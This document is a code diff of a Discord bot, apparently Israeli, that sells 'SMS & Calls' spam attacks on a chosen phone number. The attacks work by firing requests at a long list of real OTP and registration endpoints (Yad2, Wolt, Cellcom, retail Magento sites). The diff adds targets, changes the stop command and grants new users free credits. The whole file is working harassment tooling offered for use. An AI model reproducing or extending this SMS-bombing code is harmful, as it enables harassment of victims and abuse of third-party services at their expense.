@@ -41,7 +41,7 @@ class CyberBot(commands.Bot):
         intents.members = True
         super().__init__(command_prefix='!', intents=intents)
         self.start_time = datetime.now()
-        self.active_attacks = {}  # attack_id: {"stop": bool, "user_id": str}
+        self.active_attacks = {}
         self.last_request = {}
     
     async def setup_hook(self):
@@ -56,9 +56,6 @@ async def check_allowed_role(interaction: discord.Interaction) -> bool:
         await interaction.response.send_message("❌ הפקודה זמינה רק בשרת!", ephemeral=True)
         return False
     
-    if interaction.user.id == bot.owner_id:
-        return True
-    
     member = interaction.user
     if isinstance(member, discord.Member):
         if any(role.id == ALLOWED_ROLE_ID for role in member.roles):
@@ -69,20 +66,20 @@ async def check_allowed_role(interaction: discord.Interaction) -> bool:
 
 # ========== USER AGENTS ==========
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
 ]
 
-# ========== APIS - עדכני ל-2026 ==========
+# ========== APIS - 104 APIs ==========
 APIS = [
     # --- YAD2 Israel (2026 endpoints) ---
     {"name": "Yad2_Register", "url": "https://www.yad2.co.il/api/auth/register", "data": {"phone": "PHONE", "action": "send_otp"}},
     {"name": "Yad2_SMS", "url": "https://api.yad2.co.il/v1/auth/sms-send", "data": {"msisdn": "PHONE", "country": "IL"}},
     {"name": "Yad2_New", "url": "https://new.yad2.co.il/api/user/register", "data": {"phoneNumber": "PHONE"}},
     
-    # --- WOLT Israel (2026 verified) ---
+    # --- WOLT Israel ---
     {"name": "Wolt_Restaurant", "url": "https://restaurant.wolt.com/il/api/v1/customers/phone-verification", "data": {"phone_number": "PHONE"}},
     {"name": "Wolt_V8", "url": "https://wolt.com/api/v8/customers/phone-number-validation", "data": {"phone_number": "PHONE"}},
     {"name": "Wolt_App", "url": "https://app.wolt.com/api/v1/otp/send", "data": {"phone": "PHONE", "country": "IL"}},
@@ -188,6 +185,12 @@ APIS = [
     {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
     {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Renoir", "url": "https://www.renuar.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Laline", "url": "https://www.laline.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Gefen", "url": "https://www.gefen.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Avramito", "url": "https://www.avramito.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "RedHot", "url": "https://www.redhot.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Buffalo", "url": "https://www.buffalo.co.il/customer/ajax/post/", "type": "magento"},
     
     # --- SERVICES & TECH ---
     {"name": "Cellcom_Digital", "url": "https://digital-api.cellcom.co.il/api/otp/LoginStep1", "method": "PUT", "data": {"Subscriber": "PHONE_RAW", "OtpOrigin": "main OTP"}},
@@ -272,22 +275,6 @@ async def send_api(session, api, phone, phone_raw, phone_intl, domain_delays):
     except:
         return False
 
-# ========== פקודת עצירה מוחלטת ==========
-@bot.tree.command(name="stop_all", description="🛑 עצור את כל המתקפות")
-async def stop_all(interaction: discord.Interaction):
-    user_id = str(interaction.user.id)
-    stopped = 0
-    
-    for attack_id, attack_data in list(bot.active_attacks.items()):
-        if attack_data["user_id"] == user_id:
-            bot.active_attacks[attack_id]["stop"] = True
-            stopped += 1
-    
-    if stopped > 0:
-        await interaction.response.send_message(f"🛑 **עצרתי {stopped} מתקפות**", ephemeral=True)
-    else:
-        await interaction.response.send_message("❌ אין לך מתקפות פעילות", ephemeral=True)
-
 # ========== מתקפה ==========
 async def smart_attack(phone, credits, user_id, interaction, attack_id):
     phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
@@ -300,7 +287,7 @@ async def smart_attack(phone, credits, user_id, interaction, attack_id):
     end_time = datetime.now() + timedelta(seconds=duration_seconds)
     
     await interaction.followup.send(
-        f"🎯 **SMART SPAM STARTED**\n📱 {phone}\n⏱️ {credits} טוקנים = {duration_mins}ד {remaining_seconds}ש\n🎯 {len(APIS)} APIs\n🆔 מזהה מתקפה: {attack_id[:8]}",
+        f"🎯 **SPAM STARTED**\n📱 {phone}\n⏱️ {credits} טוקנים = {duration_mins}ד {remaining_seconds}ש\n🎯 {len(APIS)} APIs\n🆔 מזהה מתקפה: {attack_id[:8]}",
         ephemeral=True
     )
     
@@ -311,9 +298,8 @@ async def smart_attack(phone, credits, user_id, interaction, attack_id):
     
     try:
         while datetime.now() < end_time:
-            # בדיקה אם ביקשו לעצור
             if attack_id in bot.active_attacks and bot.active_attacks[attack_id].get("stop", False):
-                await interaction.followup.send("🛑 **המתקפה הופסקה לפי בקשתך**", ephemeral=True)
+                await interaction.followup.send("🛑 **המתקפה הופסקה**", ephemeral=True)
                 break
             
             tasks = []
@@ -329,11 +315,11 @@ async def smart_attack(phone, credits, user_id, interaction, attack_id):
             total_sent += round_sent
             
             elapsed = int((datetime.now() - (end_time - timedelta(seconds=duration_seconds))).total_seconds())
-            if elapsed - last_report >= 30:
+            if elapsed - last_report >= 60:
                 last_report = elapsed
                 remaining = duration_seconds - elapsed
-                rate = total_sent // (elapsed // 60) if elapsed >= 60 else total_sent
-                await interaction.followup.send(f"📊 {elapsed//60}ד: {total_sent} הודעות | {rate}/דקה", ephemeral=True)
+                rate = total_sent // (elapsed // 60) if elapsed >= 60 else 0
+                await interaction.followup.send(f"📊 {elapsed//60}ד: {total_sent} | {rate}/דקה", ephemeral=True)
             
             await asyncio.sleep(random.uniform(0.8, 1.5))
     
@@ -344,9 +330,40 @@ async def smart_attack(phone, credits, user_id, interaction, attack_id):
     if attack_id in bot.active_attacks:
         del bot.active_attacks[attack_id]
     
-    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent} הודעות", ephemeral=True)
+    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}", ephemeral=True)
 
-# ========== פקודות צוות ==========
+# ========== פקודת עצירה ==========
+async def stop_attacks_function(interaction: discord.Interaction):
+    user_id = str(interaction.user.id)
+    stopped = 0
+    
+    for attack_id, attack_data in list(bot.active_attacks.items()):
+        if attack_data["user_id"] == user_id:
+            bot.active_attacks[attack_id]["stop"] = True
+            stopped += 1
+    
+    if stopped > 0:
+        await interaction.response.send_message(f"🛑 **עצרתי {stopped} מתקפות**", ephemeral=True)
+    else:
+        await interaction.response.send_message("❌ אין לך מתקפות פעילות", ephemeral=True)
+
+@bot.tree.command(name="stop", description="עצור את כל המתקפות")
+async def stop_command(interaction: discord.Interaction):
+    await stop_attacks_function(interaction)
+
+@bot.tree.command(name="add_tokens", description="הוסף טוקנים (צוות)")
+async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
+    if not await check_allowed_role(interaction):
+        return
+    
+    user_id = str(member.id)
+    await users_col.update_one(
+        {"user_id": user_id},
+        {"$inc": {"tokens": amount}},
+        upsert=True
+    )
+    await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)
+
 @bot.tree.command(name="check", description="בדוק APIs (צוות)")
 async def check_command(interaction: discord.Interaction):
     if not await check_allowed_role(interaction):
@@ -373,47 +390,10 @@ async def check_command(interaction: discord.Interaction):
     
     await interaction.followup.send(f"✅ **{len(working)}** עובדים:\n" + ", ".join(working[:10]), ephemeral=True)
 
-@bot.tree.command(name="add_tokens", description="הוסף טוקנים (צוות)")
-async def add_tokens(interaction: discord.Interaction, member: discord.Member, amount: int):
-    if not await check_allowed_role(interaction):
-        return
-    
-    user_id = str(member.id)
-    await users_col.update_one(
-        {"user_id": user_id},
-        {"$inc": {"tokens": amount}},
-        upsert=True
-    )
-    await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)
-
-@bot.tree.command(name="panel", description="פתח את פאנל השליטה")
-async def panel(interaction: discord.Interaction):
-    if not await check_allowed_role(interaction):
-        return
-    
-    user_id = str(interaction.user.id)
-    user_doc = await users_col.find_one({"user_id": user_id})
-    tokens = user_doc.get("tokens", 0) if user_doc else 0
-    
-    active_attacks = sum(1 for a in bot.active_attacks.values() if a["user_id"] == user_id)
-    
-    embed = discord.Embed(
-        title="💣 OMNI TOTAL WAR - PANEL",
-        description=f"**{len(APIS)}** APIs | 3 סשנים | 0.8-1.5s דיליי",
-        color=0xff0000
-    )
-    embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
-    embed.add_field(name="🎯 מתקפות פעילות", value=active_attacks, inline=True)
-    embed.add_field(name="⏱️ 1 טוקן", value="45 שניות", inline=True)
-    embed.set_footer(text="לחץ על הכפתורים לפעולה")
-    
-    view = MainPanel()
-    await interaction.response.send_message(embed=embed, view=view)
-
-# ========== VIEW ==========
-class SpamModal(ui.Modal, title="💣 START SPAM"):
-    phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
-    credits = ui.TextInput(label="💎 טוקנים (1-100)", placeholder="5", max_length=3)
+# ========== פאנל ראשי ==========
+class SpamModal(ui.Modal, title="Start Spam"):
+    phone = ui.TextInput(label="Target Phone Number *", placeholder="972501234567")
+    credits = ui.TextInput(label="Credits to use (max 100) *", placeholder="5")
 
     async def on_submit(self, interaction: discord.Interaction):
         phone = self.phone.value.strip()
@@ -440,8 +420,8 @@ class SpamModal(ui.Modal, title="💣 START SPAM"):
         user_doc = await users_col.find_one({"user_id": user_id})
         
         if not user_doc:
-            await users_col.insert_one({"user_id": user_id, "tokens": 0})
-            user_doc = {"tokens": 0}
+            await users_col.insert_one({"user_id": user_id, "tokens": 442})
+            user_doc = {"tokens": 442}
         
         if user_doc.get("tokens", 0) < credits:
             await interaction.response.send_message(f"❌ אין לך מספיק טוקנים! יש לך {user_doc.get('tokens', 0)}", ephemeral=True)
@@ -467,24 +447,70 @@ class MainPanel(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=180)
     
-    @discord.ui.button(label="💣 START SPAM", style=discord.ButtonStyle.danger, emoji="🚀")
+    @discord.ui.button(label="📱 Smart Spam", style=discord.ButtonStyle.danger, emoji="💣")
     async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(SpamModal())
     
-    @discord.ui.button(label="💰 MY CREDITS", style=discord.ButtonStyle.secondary, emoji="💎")
+    @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.secondary, emoji="💎")
     async def credits_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         user_id = str(interaction.user.id)
         user_doc = await users_col.find_one({"user_id": user_id})
-        tokens = user_doc.get("tokens", 0) if user_doc else 0
+        tokens = user_doc.get("tokens", 442) if user_doc else 442
         await interaction.response.send_message(f"💎 יש לך **{tokens}** טוקנים", ephemeral=True)
     
     @discord.ui.button(label="🛑 STOP ALL", style=discord.ButtonStyle.primary, emoji="🛑")
     async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await stop_all(interaction)
+        await stop_attacks_function(interaction)
+
+@bot.tree.command(name="panel", description="פתח את פאנל השליטה")
+async def panel(interaction: discord.Interaction):
+    user_id = str(interaction.user.id)
+    user_doc = await users_col.find_one({"user_id": user_id})
+    tokens = user_doc.get("tokens", 442) if user_doc else 442
+    
+    embed = discord.Embed(
+        title="Spam-Me Control Panel",
+        description="Use the buttons below to interact with the bot.",
+        color=0x2b2d31
+    )
+    embed.add_field(
+        name="📱 **Smart Spam**",
+        value="SMS & Calls (costs credits)",
+        inline=False
+    )
+    embed.add_field(
+        name="💰 Your Credits",
+        value=f"**{tokens}** credits\n45 seconds",
+        inline=True
+    )
+    embed.add_field(
+        name="1 Credit",
+        value=f"{len(APIS)} APIs · Cloudflare",
+        inline=True
+    )
+    
+    view = MainPanel()
+    await interaction.response.send_message(embed=embed, view=view)
+
+@bot.tree.command(name="tokens", description="בדוק טוקנים")
+async def tokens_command(interaction: discord.Interaction):
+    user_id = str(interaction.user.id)
+    user_doc = await users_col.find_one({"user_id": user_id})
+    tokens = user_doc.get("tokens", 0) if user_doc else 0
+    await interaction.response.send_message(f"💎 יש לך {tokens} טוקנים (כל טוקן = 45 שניות)", ephemeral=True)
+
+@bot.tree.error
+async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
+    if isinstance(error, app_commands.CheckFailure):
+        pass
+    else:
+        try:
+            await interaction.response.send_message(f"❌ שגיאה: {str(error)}", ephemeral=True)
+        except:
+            pass
 
 if __name__ == "__main__":
-    print(f"🎯 OMNI TOTAL WAR - {len(APIS)} APIs!")
+    print(f"🎯 פאנל Spam-Me מוכן עם {len(APIS)} APIs!")
     print(f"🔒 רול מורשה: {ALLOWED_ROLE_ID}")
     print(f"⏱️ 1 טוקן = 45 שניות")
-    print(f"🛑 כפתור עצירה מוחלטת נוסף!")
     bot.run(TOKEN)
